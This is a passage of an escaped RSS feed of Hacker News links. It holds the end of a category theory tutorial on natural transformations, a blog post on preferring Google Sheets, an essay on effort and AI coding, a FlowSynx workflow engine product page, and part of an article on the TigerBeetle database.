categories.&lt;/p&gt;&lt;p&gt;In this section we are interested with the products of one particular category, namely the category we called $2$, containing two objects and one morphism (stylishly represented in black and white).&lt;/p&gt;&lt;p&gt;This category is the key to constructing a functor that is equivalent to a natural transformation:&lt;/p&gt;&lt;p&gt;So, given a product category of $2$ and some other category $C$…&lt;/p&gt;&lt;p&gt;…there exist a natural transformation between $C$ and the product category $2\times C$.&lt;/p&gt;&lt;p&gt;Furthermore, this connection is two-way: any natural transformation from $C$ to some other category (call it $D$, as it is customary) can be represented as a functor $2 \times C \to D$.&lt;/p&gt;&lt;p&gt;That is, if we have a natural transformations $\alpha : F \Rightarrow G$ (where $F: C \to D$ and $G: C \to D$), then, we also have a functor $2 \times C \to D$, such that if we take the subcategory of $2 \times C$ comprised of just those objects that have the $0$ object as part of the pair, and the morphisms between them, we get a functor that is equivalent to $F$, and if we consider the subcategory that contains $1$, then the functor is equivalent to $G$ (we write $\alpha(-,0)=F$ and $\alpha(-,1)=G$). Et voilà!&lt;/p&gt;&lt;p&gt;Task 5: Show that the two definitions are equivalent.&lt;/p&gt;&lt;p&gt;This perspective helps us realize that a natural transformation can be viewed as a collection of commuting squares. The source functor defines the left-hand side of each square, the target functor — the right-hand side, and the transformation morphisms join these two sides.&lt;/p&gt;&lt;p&gt;We can even retrieve the structure of the source category of these functors, which (as categories are by definition structure and nothing more) is equivalent to retrieving the category itself.&lt;/p&gt;&lt;p&gt;Natural transformations are surely a different beast than normal morphisms and functors and so they don’t compose in the same way. However, they do compose and here we will show how.&lt;/p&gt;&lt;p&gt;Let’s first get one trivial definition out of the way: for each functor, we have the identity natural transformation (actually a natural isomorphism) between it and itself.&lt;/p&gt;&lt;p&gt;The setup for composing natural transformations may look complicated the first time you see it: we need three categories $C$, $D$ and $E$ (just as composition of morphisms requires three objects). We need a total of four functors, distributed on two pairs, one pair of functors that goes from $C$ to $D$ and one that goes from $D$ to $E$ (so we can compose these two pairs of functors together, to get a new pair of functors that go $C \to E$). However, we will try to keep it simple and we will treat the natural transformation as a map from a morphism to a commuting square. As we showed above, this mapping already contains the two functors in itself.&lt;/p&gt;&lt;p&gt;So, let’s say that we have the natural transformation $\alpha$ involving the $C \to D$ functors (which we usually call $F$ and $G$).&lt;/p&gt;&lt;p&gt;So, what will happen if we have one more transformation $\bar\alpha$ involving the functors that go $D \to E$ (which are labelled $F’$ and $G’$)? Well, since a natural transformation maps each morphism to a square, and a square contains four morphisms (two projections by the two functors and two components of the transformation), a square would be mapped to four squares.&lt;/p&gt;&lt;p&gt;Let’s start by drawing two of them for each projection of the morphism in $C$.&lt;/p&gt;&lt;p&gt;We have to have two more squares, corresponding to the two morphisms that are the components of the $\alpha$ natural transformation. However, these morphisms connect the objects that are the target of the two functors, objects that we already have on our diagram, so we just have to draw the connections between them.&lt;/p&gt;&lt;p&gt;The result is an interesting structure which is sometimes visualized as a cube.&lt;/p&gt;&lt;p&gt;More interestingly, when we compose the commuting squares from the sides of the cube horizontally, we see that it contains not one, but two bigger commuting squares (they look like rectangles in this diagram), visualized in grey and red. Both of them connect morphisms $F’Ff$ and $G’Gf$.&lt;/p&gt;&lt;p&gt;So, there is a natural transformation between the composite functor $F’ \circ F : C \to E$ and $G’ \circ G : C \to E$ — a natural transformation that is usually marked $\bar\alpha \bullet \alpha$ (with a black dot).&lt;/p&gt;&lt;p&gt;Task 6: Show that natural transformations indeed compose i.e. that if you have natural transformations $F’Ff \Rightarrow F’Gf$ and $F’Gf \Rightarrow G’Gf$ you have $F’Ff \Rightarrow G’Gf$.&lt;/p&gt;&lt;p&gt;And an interesting special case of horizontal composition is horizontal composition involving the identity natural transformation: given a natural transformation $\bar\alpha$ involving functors with signature $D \to E$ and some functor with signature $F : C \to D$, we can take $\alpha$ to be the identity natural transformation between functor $F$ and itself and compose it with $\bar\alpha$.&lt;/p&gt;&lt;p&gt;We get a new natural transformation $\bar\alpha \bullet \alpha$, that is practically the same as the one we started with (i.e. the same as $\bar\alpha$) so what’s the deal? We just found a way to extend natural transformations, using functors: i.e we can use a functor with signature $C \to D$ to extend a $D \to E$ natural transformation and make it $C \to E$.&lt;/p&gt;&lt;p&gt;Task 7: Try to extend the natural transformation in the other direction (by taking $\bar\alpha$ to be identity).&lt;/p&gt;&lt;p&gt;So, this is how you compose natural transformations. It’s too bad that this is form of composition is different from the standard categorical composition. So, I guess natural transformations do not form a category, like we hoped they would…&lt;/p&gt;&lt;p&gt;Well, OK, there is actually another way of composing categories, which might actually work.&lt;/p&gt;&lt;p&gt;Recall that categorical composition involves three objects and two successive arrows between them. For vertical composition of natural transformations, we will need three (or more) functors with the same type signature, say $F, G, H: C \to D$ i.e. (same source and target category) and two successive natural transformations between those functors i.e. $\alpha: F \to G$ and $\beta: G \to H$.&lt;/p&gt;&lt;p&gt;We can combine each morphism of the natural transformation $\alpha$ (e.g. $a: F \to G$) and the corresponding morphism of the natural transformation $\beta$ (say $b:G \to H$) to get a new morphism, which we call $b \circ a : F \to H$ (the composition operator is the usual white circle, as opposed to the black one, which denotes horizontal composition). And the set of all such morphisms are precisely the components of a new natural transformation: $\beta \circ \alpha : F \to H$.&lt;/p&gt;&lt;p&gt;Now, we are approaching the end of the chapter, we will introduce our category and call it quits. To do that, we first introduce a more compressed notation for vertical composition of natural transformations (where they do indeed look vertical).&lt;/p&gt;&lt;p&gt;We started this chapter by looking at category of sets and using internal diagrams, displaying the set elements as points and the sets/objects as collections.&lt;/p&gt;&lt;p&gt;Task 8: identify the function, the three functors, and the two natural transformations used in this diagram.&lt;/p&gt;&lt;p&gt;Then, we quickly passed to normal external diagrams, where objects are points and categories are collections.&lt;/p&gt;&lt;p&gt;And now we go one more level further, and show the category of categories, where categories are points and functors are morphisms.&lt;/p&gt;&lt;p&gt;In this notation, we display natural transformations as (double) arrows between morphisms.&lt;/p&gt;&lt;p&gt;And you can already see the new category that is formed: For each two categories (like $C$ and $D$ in this case), there exists a category which has functors for objects and natural transformations as morphisms.&lt;/p&gt;&lt;p&gt;Natural transformations compose with vertical compositions, and, of course, the identity natural transformation is the identity morphism.&lt;/p&gt;&lt;p&gt;Vertical and horizontal composition of natural transformations are related to each other in the following way:&lt;/p&gt;&lt;p&gt;If we have (as we had) two successive natural transformations, in the vertical sense, like $\alpha: F \to G$ and $\beta: G \to H$.&lt;/p&gt;&lt;p&gt;And two successive ones, this time in horizontal sense e.g. $\bar\alpha: F’ \to G’$ and $\bar\beta: G’ \to H’$. (note that $\alpha$ has nothing to do with $\bar\alpha$ as $\beta$ has nothing to do with $\bar\beta$, we just call them that way to avoid using too many letters)&lt;/p&gt;&lt;p&gt;And if the two pairs of natural transformations both start from the same category and the same functor, then the compositions of the two pairs of natural transformations obey the following law&lt;/p&gt;\[(β \circ α) \bullet (\bar β \circ \bar α) = (β \bullet \bar β) \circ (α \bullet \bar α)\]&lt;p&gt;Task 9: Draw the paths of the two compositions of the transformations (on the two sides of the equation) and ensure that they indeed lead to the same place.&lt;/p&gt;&lt;p&gt;At this point you might be wondering the following (although statistically you are more likely to wonder what the heck is all this about): We know that all categories are objects of $Cat$, the category of small categories, in which functors play the role of morphisms.&lt;/p&gt;&lt;p&gt;But, functors between given categories also form a category, under vertical composition. Which means that $Cat$ not only has (as any other category) morphisms between objects, but also has morphisms between morphisms. And furthermore, those two types of morphisms compose in this very interesting way.&lt;/p&gt;&lt;p&gt;So, what does that make of $Cat$? I don’t know, perhaps we can call natural transformations “2-morphisms” and $Cat$ is some kind of “2-category”?&lt;/p&gt;&lt;p&gt;But wait, actually it’s way too early for you to find out. We haven’t even covered limits…&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45435422</guid><pubDate>Wed, 01 Oct 2025 08:00:30 +0000</pubDate></item><item><title>I only use Google Sheets</title><link>https://mayberay.bearblog.dev/why-i-only-use-google-sheets/</link><description>&lt;doc fingerprint="fa48d2484db7b5f4"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Why I only use Google sheets&lt;/head&gt;
    &lt;p&gt;To cut things short, always use the easiest solution to solve a particular problem and once that solution does not work for the business anymore reassess what the new requirements are and either try enhance the current solution or find an alternative that better solve the problem. In my case the easiest solution is often creating a new Google sheet.&lt;/p&gt;
    &lt;p&gt;I entered the workforce about 9 months ago and my optimism for building new tools and services that help the small starting up business I work for has all vanished. I work in an environment that changes every 2 months or so, as my boss finds a new business venture she wants to enter. This has me starting and stopping quite a few projects that could have been solved in an afternoon with a quick Google Sheet.&lt;/p&gt;
    &lt;p&gt;I have listed a few examples below of some of the projects I have wasted time on instead of making a Google Sheet:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;I spent 2 months designing and making an admin panel to manage and track incoming cargo for the business. This panel was supposed to help the business categorise and better manage packages and customer data. This admin panel was used twice and never again. A Google Sheet could have been easily used for this and is currently being used for this task.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Three weeks were spent creating an MVP for a quote system that automatically calculated the duty and taxes for people ordering certain goods. Zimbabwean taxes and duties are often very complex and having our customers know exactly what to pay would create a better customer journey and make the process faster since we would not have to wait on our third party duty processing company to reply to us on every customer inquiry. In the end, we saw one of our competitors tax and duty breakdown table and we just copied it and put it in a Google Sheet.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Spent 2 months researching, having meetings (often &amp;gt; 1hr long) and looking for a good CRM to use for the business. I would sit down compare and contrast different feature`s and prices for all the different CRMs we were looking into. We ended up using the free version of Oddo, that is not used that much anyway within the business. To my surprise a few weeks ago i noticed that Google Sheets has a CRM template built into it.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I'm not saying that making a Google Sheet is the best solution to every problem but often times in my situation it is. I usually end up in situations were I never know the full scope of the problem until we start doing the actual work.&lt;/p&gt;
    &lt;p&gt;This is not to say that we do not need to plan out a project. The team should discuss workflows and information they might need but until we start doing the actual work we do not know full scope of the problem.&lt;/p&gt;
    &lt;p&gt;Once the full scope of the problem is known then we can start creating or enhancing the solutions we have. This helps because you do not end up being stuck with an extra workload that in the best case does not require all the features you are adding and in the worst case spending time on a project that will fail. So it is in your best interest to use the most basic solution to solve a problem.&lt;/p&gt;
    &lt;p&gt;Doing the smallest and easiest solution to a problem as a way to get to know the full scope and then iterating after that if needs be is by far the best solution (for me).&lt;/p&gt;
    &lt;p&gt;There are some caveats to this approach, I know a few organisation that have a thousand row spreadsheets that keep track of all their business transactions and employee information.&lt;/p&gt;
    &lt;p&gt;Creating a Google Sheet only works in situations were we do not know the full scope of the problem. Personally, I'm still new to this and learning when the best solution is making a Google Sheet or not. I just want to save people's time and effort and not have them build something that will never be used. But like all advice, think carefully about your own situation before committing a lot of time and effort especially in a business setting. It is perfectly fine for you to build useless programs and software in your spare time, that's the whole fun of it.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45435463</guid><pubDate>Wed, 01 Oct 2025 08:06:50 +0000</pubDate></item><item><title>Our efforts, in part, define us</title><link>https://weakty.com/posts/efforts/</link><description>&lt;doc fingerprint="3282d051aea7cfd9"&gt;
  &lt;main&gt;
    &lt;p&gt;What happens when something we enjoy doing that took effort becomes effortless? And what happens if that original effort was a foundation on which we saw value in ourselves?&lt;/p&gt;
    &lt;p&gt;If our efforts, in part, define us, then our efforts have intrinsic value. Our efforts may help us understand a position we want to occupy, an identity we carry, or an outlook we present. This value contributes to an internal economy of joy, self-respect, fulfillment, happiness. When effortful things become effortless, what becomes of our position in these economies?&lt;/p&gt;
    &lt;p&gt;As you can see, I have a few questions here.&lt;/p&gt;
    &lt;p&gt;I know someone who spent a part of their adult life taking beautiful photographs, developing them by hand, framing them, cataloging them. Along came the ubiquity of digital cameras and smartphones, and "film" became infinitely available. Offhandedly, one day, this person mentioned that with the proliferation of smart phone cameras, and the ease with which one can take photos, they had found that some days their desire to continue was diminishing, and their work had lost meaning.&lt;/p&gt;
    &lt;p&gt;Technology has a history of making effortful things effortless, and there is sometimes a hidden loss in that advancement.&lt;/p&gt;
    &lt;p&gt;I figure people are continually being left behind in a similar manner day-to-day. Technology continues advancing (for the most part), and more things that remain effortful will become effortless. And "we" (ie, the populations who can afford to sit around and have crises of identity on these topics) will be further pushed to re-evaluate certain parts of our definitions of self.&lt;/p&gt;
    &lt;p&gt;For myself, in the last 10 years, my work of writing code has largely defined what I do with my working time. Now I experience large swaths of that work being created and done by AI (sometimes amazingly well, sometimes poorly), and I find myself thinking of the photographer above. It's not my wish that people can't have access to a more effortless way to write code, but I feel a strange sadness that there is less left to the act of the craft.&lt;/p&gt;
    &lt;p&gt;I have had this note in a draft state for several weeks now because I still can’t quite come to terms with how I’m feeling about things. There are so many nuances and unclear thoughts rolling around in my head about this shift. I think the only thing that is vaguely clear is that none of this would matter if making money wasn’t at play. If I was just writing code, (or taking film photographs) for fun in my free time because I enjoyed it, well, I don’t think I’d be feeling so conflicted.&lt;/p&gt;
    &lt;p&gt;Being paid to work and presenting my capacities through my craft is an exchange that I have been able to derive value from in its effortful-ness. Often times I've worked on utterly boring tasks that I would have loved to have a tool that could automate. But I didn't. And even in those menial moments I did derive some pleasure in my capacities. Of course, when it came to the real challenges, that was where I felt a pleasure and value in putting forth effort.&lt;/p&gt;
    &lt;p&gt;As a consultant, I work in a lot of different places, often for brief stints of time. And at many of these places, I see a large push, top-down, to encourage people to use AI. These employees, previously having entered an employment agreement where their capacities and experience would be exchanged for money, are now being asked that their abilities be augmented. In this way, the level continues to skew toward privileging production, often without understanding and people using their own perspectives.&lt;/p&gt;
    &lt;p&gt;When I see sentiments similar to mine, I often see reactions where people say that AI is simply a tool and that you must learn to use it and incorporate it into your toolbox. That's fine. That's well and good. But all I'm trying to say here is that I feel a lack and a loss for something. I don't understand it yet.&lt;/p&gt;
    &lt;p&gt;The title of this post, our efforts, in part, define us, is just a phrase that popped into my head. I'm not really sure if I even believe it or if I've fully fleshed out this single statement. But some part of it rings true to me. I wonder what will happen to us and our efforts. Will we be driven into further niches that are effortful, that we can derive value from? Will we become vague blobs that are formless, ill-defined, and despondent?&lt;/p&gt;
    &lt;p&gt;All of this presupposes a few things —that one can (and/or should) aim to derive value from work, that a meaningful identity is constructed by doing effortful things, that people generally are happier when they can use their skills and experiences to make something. And what’s more, there is a fine-line here between glorifying people with experience deriving value, and sounding like a shitty gatekeeper.&lt;/p&gt;
    &lt;p&gt;I will continue working for various clients. I suspect I will continue hearing leadership push AI on employees. And I will continue observing how people respond to this. Of course, for many people a job is just a job, as they say, and they'll do whatever they can to get it done more quickly (or work several jobs at once). Those very same people might find more value from their efforts now that AI is making their jobs easier. They can turn to better supporting their family, following other interests outside of work, finding other meaningful things, etc.&lt;/p&gt;
    &lt;p&gt;But at this time, I don't really see how this won’t further trample people’s spirits in the realm of work, unless we also reshape our expectations of work itself.&lt;/p&gt;
    &lt;p&gt;Is it worth the effort?&lt;/p&gt;
    &lt;p&gt;❦&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45435825</guid><pubDate>Wed, 01 Oct 2025 09:22:10 +0000</pubDate></item><item><title>FlowSynx – Orchestrate Declarative, Plugin-Driven DAG Workflows on .NET</title><link>https://flowsynx.io/</link><description>&lt;doc fingerprint="e89eea02c0142dc2"&gt;
  &lt;main&gt;
    &lt;head rend="h3"&gt;FlowSynx: Orchestrate Declarative, Plugin-Driven DAG Workflows on .NET&lt;/head&gt;
    &lt;p&gt;Seamless Workflow Automation—Declarative, Extensible, and Fully Controllable. Turn complex processes into maintainable, auditable, and transparent workflows that adapt to your business needs.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is the FlowSynx?&lt;/head&gt;
    &lt;p&gt;The mission of FlowSynx is clear: deliver a lightweight, extensible, and developer-friendly engine that adapts to diverse domains—from data engineering and DevOps to healthcare, finance, and enterprise integrations. It strikes the perfect balance between no-code simplicity and full-code flexibility, allowing teams to tailor workflows precisely to their needs through a modular, plugin-driven architecture.&lt;/p&gt;
    &lt;p&gt;At its core, FlowSynx leverages a micro-kernel design, cleanly separating orchestration logic from functional extensions. This decoupled architecture allows you to dynamically load, develop, or replace plugins without disrupting system stability—making FlowSynx highly customizable, maintainable, and easy to upgrade.&lt;/p&gt;
    &lt;head rend="h2"&gt;FlowSynx features and capabilities&lt;/head&gt;
    &lt;head rend="h3"&gt;Plugin-Based Extensibility&lt;/head&gt;
    &lt;p&gt;Each functional component in FlowSynx—from task definitions and runtime behaviors to integration endpoints and authentication providers—is treated as a plugin. Users can develop custom plugins using well-defined interfaces and register them with the system, enabling FlowSynx to adapt to specific business rules, protocols, or environments.&lt;/p&gt;
    &lt;head rend="h3"&gt;Cross-Platform Execution&lt;/head&gt;
    &lt;p&gt;FlowSynx is designed to run seamlessly across major platforms, including Windows, Linux, and macOS. Additionally, it offers containerized deployment via Docker, making it ideal for integration into modern DevOps pipelines, Kubernetes environments, or hybrid cloud architectures.&lt;/p&gt;
    &lt;head rend="h3"&gt;Workflow Definition and Execution&lt;/head&gt;
    &lt;p&gt;Workflows in FlowSynx are defined as Directed Acyclic Graphs (DAGs) using JSON or DSL representations. These workflows support conditional logic, parallel execution, error handling, input/output mapping, and custom execution contexts—enabling advanced control flow with traceability and fault tolerance.&lt;/p&gt;
    &lt;head rend="h3"&gt;Command-Line Interface (CLI)&lt;/head&gt;
    &lt;p&gt;A comprehensive CLI tool is included for managing workflows, invoking executions, debugging tasks, monitoring logs, and interacting with the system at a low level. This is ideal for scripting, batch jobs, and infrastructure automation.&lt;/p&gt;
    &lt;head rend="h3"&gt;Software Development Kit (SDK)&lt;/head&gt;
    &lt;p&gt;FlowSynx provides a full-featured SDK for programmatic access. Developers can use the SDK to integrate workflow functionality into their applications, define dynamic workflows at runtime, fetch execution results, and implement plugin hosting strategies. The SDK is structured with clean architecture principles and is available in .NET, with planned bindings for other ecosystems via REST APIs or language bridges.&lt;/p&gt;
    &lt;head rend="h3"&gt;REST-API Accessibility&lt;/head&gt;
    &lt;p&gt;Exposes core functionality through a well-documented, versioned RESTful API that enables secure remote access and seamless integration across platforms and programming languages. The API supports standard HTTP methods (GET, POST, PUT, DELETE), offers comprehensive OpenAPI/Swagger documentation, and includes authentication, rate limiting, and error handling mechanisms to ensure robustness, scalability, and ease of use for developers.&lt;/p&gt;
    &lt;head rend="h3"&gt;Console: Web-UI Management&lt;/head&gt;
    &lt;p&gt;The FlowSynx Console provides a modern, browser-based interface for workflow management. Users can visually design, configure, and monitor workflows, review execution logs, and manage plugins directly from the web UI. With real-time dashboards, drag-and-drop workflow editing, and secure multi-user access, the Console simplifies collaboration and operational oversight across distributed teams.&lt;/p&gt;
    &lt;head rend="h3"&gt;Authentication and Security&lt;/head&gt;
    &lt;p&gt;FlowSynx includes pluggable authentication support, enabling integration with modern identity providers such as OAuth2, OpenID Connect (e.g., Keycloak), as well as support for basic and token-based authentication. Security policies can be enforced per user, per plugin, and per workflow execution.&lt;/p&gt;
    &lt;head rend="h3"&gt;Logging, Monitoring, and Auditing&lt;/head&gt;
    &lt;p&gt;All workflow executions and plugin interactions are fully traceable. The system provides structured logging, execution history, and audit trail support for compliance and observability.&lt;/p&gt;
    &lt;head rend="h3"&gt;Standalone and Containerized Modes&lt;/head&gt;
    &lt;p&gt;FlowSynx can operate as a lightweight local service for single-user or single-machine scenarios, or it can scale horizontally through distributed orchestration models—enabling large-scale, multi-tenant execution across clusters or cloud-native infrastructures.&lt;/p&gt;
    &lt;head rend="h3"&gt;Trigger-Based Workflow Execution&lt;/head&gt;
    &lt;p&gt;Automatically launch workflows in response to specific events like file uploads, API calls, or scheduled intervals. Triggers eliminate manual intervention by monitoring conditions and instantly activating corresponding task flows, ensuring real-time, event-driven automation.&lt;/p&gt;
    &lt;head rend="h3"&gt;Human-in-the-Loop (HITL) Approval&lt;/head&gt;
    &lt;p&gt;Integrate human decision points into automated workflows with Human-in-the-Loop Approval. This feature pauses execution until an authorized user manually approves or rejects a pending task. Ideal for scenarios requiring compliance checks, risk assessment, or business validation, it adds a layer of control and accountability within otherwise automated processes.&lt;/p&gt;
    &lt;head rend="h3"&gt;Flexible Error Handling&lt;/head&gt;
    &lt;p&gt;Ensure workflow resilience with configurable error-handling strategies that define how failures are managed during execution. Choose from Retry, Skip, or Abort behaviors to match the criticality of each task. Fine-tune retry behavior with customizable policies, including maximum retries, initial delay, and backoff strategies such as Fixed, Linear, Exponential, or Jitter, enabling intelligent recovery from transient failures without manual intervention.&lt;/p&gt;
    &lt;head rend="h2"&gt;Architecture overview&lt;/head&gt;
    &lt;head rend="h3"&gt;Intraction tools&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;CLI Interface: Command-line tools for interacting with the FlowSynx system, enabling workflow management and execution from terminals.&lt;/item&gt;
      &lt;item&gt;REST API Gateway: Provides secure, HTTP/HTTPS RESTful APIs to integrate with external systems, allowing remote workflow control and status querying.&lt;/item&gt;
      &lt;item&gt;SDK (Library): Developer-friendly libraries exposing FlowSynx functionalities programmatically, enabling custom applications to embed or automate workflow operations.&lt;/item&gt;
      &lt;item&gt;UI-Based Console Management: Intuitive browser-based interface for real-time monitoring and administration of workflows, and system settings with secure authentication.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;FlowSynx Core&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Workflow Orchestrator: Loads and executes workflows defined as JSON DAGs.&lt;/item&gt;
      &lt;item&gt;Plugin Manager: Dynamically loads plugins and maintains a plugin marketplace/registry.&lt;/item&gt;
      &lt;item&gt;Security &amp;amp; Auth: Handles authentication and authorization for both REST API and CLI access.&lt;/item&gt;
      &lt;item&gt;Logging &amp;amp; Auditing: Tracks workflow execution, plugin activity, and audit trails.&lt;/item&gt;
      &lt;item&gt;Trigger Engine: Listens for external events or schedules workflows to start based on timers, webhooks, or system signals.&lt;/item&gt;
      &lt;item&gt;Error handling: Built-in support for task retries, timeouts, and fallbacks ensures reliable execution even in unstable environments. Custom retry strategies can be defined per task.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Execution environments&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Deployment &amp;amp; Execution Environments: Supports flexible deployment models from standalone desktop/server installs to cloud containerized orchestration, with cross-platform compatibility.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45436027</guid><pubDate>Wed, 01 Oct 2025 10:00:29 +0000</pubDate></item><item><title>TigerBeetle is a most interesting database</title><link>https://www.amplifypartners.com/blog-posts/why-tigerbeetle-is-the-most-interesting-database-in-the-world</link><description>&lt;doc fingerprint="b719907d89353fdf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Why TigerBeetle is the most interesting database in the world&lt;/head&gt;
    &lt;p&gt;By many measures itâs safe to say that TigerBeetle is the most interesting database in the world. Like Costanza in Seinfeld, they seem to do the opposite of everyone else:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Most teams write code fast. TigerBeetle tries to write code slow.&lt;/item&gt;
      &lt;item&gt;Most teams treat testing as a necessary evil. TigerBeetle is built entirely on Deterministic Simulation Testing (DST).&lt;/item&gt;
      &lt;item&gt;Most teams build their software on top of loads of other software. TigerBeetle has zero dependencies.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thereâs even more. TigerBeetle enforces static memory allocation. They keep assertions enabled in production. They chose Viewstamped Replication over Raft, and even Zig instead of Rust!&lt;/p&gt;
    &lt;p&gt;This read is going to go behind the scenes of how TigerBeetle came to be, the incredibly novel software theyâve built, and all of the wacky, wonderful things that make them so special. Based on extensive interviews with the TigerBeetle team, weâre going to cover a few topics in technical detail:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Why transactional databases should think in debits and credits, not SQL&lt;/item&gt;
      &lt;item&gt;An (actually) modern database: distributed by default, handling storage faults, and why TigerBeetle uses Zig&lt;/item&gt;
      &lt;item&gt;VOPR, TigerBeetleâs Deterministic Simulation Testing cluster&lt;/item&gt;
      &lt;item&gt;TigerStyle, and why you should use assertions&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Click on any section to jump straight there, if youâre curious.Â Â&lt;/p&gt;
    &lt;head rend="h2"&gt;Why we need a database that thinks in debits and credits&lt;/head&gt;
    &lt;p&gt;TigerBeetleâs website calls it âThe Financial Transactions Database.â Its primitives are debits and credits, which are things you may be familiar with from your accounting requirement in college. And if youâre not a bank, youâre probably thinking this whole thing isnât really for you. But Joran (TigerBeetleâs creator) would tell you otherwise: financial transactions, i.e. debits and credits, are actually exactly what transactional SQL was originally designed for.Â&lt;/p&gt;
    &lt;p&gt;Way back in 1985, Jim Gray (who would later win a Turing Award) wrote a seminal paper on transactions, titled A Measure of Transaction Processing Power. If youâve heard of it before, itâs because in it, Gray defined a metric that 40 years later is still the most important measure for a database: TPS, or transactions per second. This would end up leading to such a fervent benchmark war among databases that an objective council â the TPC â needed to be formed to moderate.&lt;/p&gt;
    &lt;p&gt;But what does the âTâ in TPS actually mean? What is a transaction?&lt;/p&gt;
    &lt;p&gt;Your first guess might be a SQL transaction, but thatâs not it. Gray actually defined it as a business transaction derived from the real world. Which is the reason databases were invented in the first place: to power businesses. And indeed, 20 years later, Gray continued to see the standard measure of transaction processing as a âDebitCredit:â&lt;/p&gt;
    &lt;quote&gt;âA database system to debit a bank account, do the standard double-entry bookkeeping and then reply to the terminal.â&lt;/quote&gt;
    &lt;p&gt;Mind you, SQL had already been around since the 70s at this point. And yet the luminary Gray still chose the debit/credit model â because it was the canonical example of an everyday transaction. Debit/credit is the lingua franca of what it means to transact. It is not just for accounting and banks. Itâs the reason for a database to provide guarantees like ACID in the first place.&lt;/p&gt;
    &lt;p&gt;And yet, if you want to use a SQL database to implement debits and credits today, you are probably going to have a bad time. To handle one debit/credit, a typical system â like the central bank switch that Joran consulted on in 2020 â needs to query account balances, lock those rows, wait for decisions in code, then write back and record the debit/credit. All in all, youâre looking at 10-20 SQL queries back and forth, while holding row locks across the network roundtrip time, for each transaction. This gets even worse when you consider the problem of hot rows, where many transactions often need to touch the same set of âhouse accountsâ.Â&lt;/p&gt;
    &lt;p&gt;All the while (for better or worse), the world is moving faster and faster towards an âeverything is a transactionâ model. Countries like India and Brazil are doing billions of transactions per month in instant payments. With FedNow in the U.S., weâre not far away from that reality either. Meanwhile, other sectors like energy, gaming, and cloud are all moving towards real-time billing. In less than a decade, the world has become at least three orders of magnitude more transactional. And yet the SQL databases we still use to power this are 20-30 years old. Can they hold up?&lt;/p&gt;
    &lt;p&gt;This is where TigerBeetle comes in. They designed a state-of-the-art database, from the ground up, to power the next era of transactions. In TigerBeetle, a debit/credit is a first class primitive and 8,190 of them can pack into a single 1MiB query via a one solitary roundtrip to the database. They call it âThe 1000x Performance Idea,â but in Joranâs words itâs ânothing specialâ.&lt;/p&gt;
    &lt;p&gt;They say databases take a decade to build. But TigerBeetle is complete and pretty much Jepsen-proof after just 3 and a half years. In June 2025, Kyle Kingsbury showed he was unable to break TigerBeetleâs foundations (he found 1 correctness bug in the read query engine, not affecting durability), even while corrupting the whole thing on every machine in various places.Â&lt;/p&gt;
    &lt;p&gt;The obvious question here â how? How did TigerBeetle ship a production-ready, Jepsen-passing consensus and storage engine in 3.5 years when it typically takes a decade or more?&lt;/p&gt;
    &lt;head rend="h2"&gt;An (actually) modern database: distributed by default, why TigerBeetle uses Zig, and handling storage faults&lt;/head&gt;
    &lt;p&gt;Imagine you wake up today and wisely decide to build a database from scratch. Instead of investing in the technology of 30 years ago â when the most popular relational databases today were built â you can pick any advancements in architecture, hardware, language, or research since then to implement. How would you build it? What would you utilize?&lt;/p&gt;
    &lt;head rend="h3"&gt;Distributed by default&lt;/head&gt;
    &lt;p&gt;One thing youâd probably start with is the deployment model.Â&lt;/p&gt;
    &lt;p&gt;When Postgres and MySQL were built, in a world of big iron (on-prem hardware), the dominant paradigm was single node. Now, in a world of shared cloud hardware, itâs distributed. Itâs not safe enough to store your transactions only on a single disk or server. A modern database needs to replicate your transactions, with strict serializability, across machines, for redundancy, fault tolerance and high availability. And yet some of the most popular OLTP databases in the world today are still highly dependent on a single node architecture. Automated failover, at least with zero data loss in the cut over, is not always baked in by default.&lt;/p&gt;
    &lt;p&gt;So TigerBeetle built their database to be distributed by default. Doing that comes with some of the obvious things you need to do, like consensus. But the developer experience for running TigerBeetle distributed is very simple: you just install the binary on however many machines you want in the cluster. No async replication, no Zookeeper, etc. To make this possible, TigerBeetle invested heavily in their consensus protocol implementation, adopting the pioneering Viewstamped Replication from MIT. This is part of why TigerBeetle has zero dependencies, apart from the Zig toolchain â they literally invested in all their core dependencies.&lt;/p&gt;
    &lt;head rend="h3"&gt;Clock fault tolerance&lt;/head&gt;
    &lt;p&gt;Distributed by default also shows up in some unlikely places. For example: have you ever thought of a clock fault model?Â&lt;/p&gt;
    &lt;p&gt;Though itâs not technically required or advised for consensus â which uses logical clocks and not physical clocks â remember that TigerBeetle is a transactions database. The physical timestamps of transactions need to be accurate and comparable across different financial systems for auditing and compliance.&lt;/p&gt;
